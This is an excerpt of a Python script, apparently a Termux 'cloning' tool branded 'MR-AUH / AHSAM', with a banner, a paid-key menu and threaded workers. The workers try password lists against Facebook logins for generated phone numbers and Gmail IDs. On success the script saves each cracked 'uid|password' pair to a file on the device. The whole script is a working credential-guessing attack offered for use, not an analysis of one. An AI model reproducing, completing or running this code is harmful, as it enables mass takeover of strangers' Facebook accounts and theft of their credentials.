...
os.system('xdg-open https://www.facebook.com/pages/N3V3R.TRUST.ANY0N3.0N.F4C3B00K/')
...
logo=("""
\\0MR-AUH31m _______  _______    _______  
\033[1;33m (       )(  ____ )  (  ___  )|\     /||\     /|
\033[1;34m | () () || (    )|  | (   ) || )   ( || )   ( |
...
║▶  OWNER       🤧     MR-AUH-BRAND          
║▶  GITHUB       😉     MR-AUH404           
║▶  FACEBOOK 🤧     AHSAM TRICKER              
║▶  VERSION    😉           1.0.2                             
║▶  TOOLS        😎 RANDOM + FILE CLONNING  
║▶  STATUS      😋           FREE   
----------------------------------------------
IM MR-AUH BRAND FROM PAKISTAN😎
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        linex()
                        tks = ("Hi AHSAM Sir, I Need To Buy Your Paid AHSAM PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python SHAMROZ.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as SHAMROZ:     
                        clear()
                        tl = str(len(user))
...
def gmail():
                ...
                with tred(max_workers=30) as AHSAM:
                        ...
                        for user in fo:
                                ...
                                SHAMROZ.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [AHSAM-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/AHSAM-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [AHSAM-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/AHSAM-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [AHSAM-OK] '+uid+' | '+pas+'\033[1;97m')
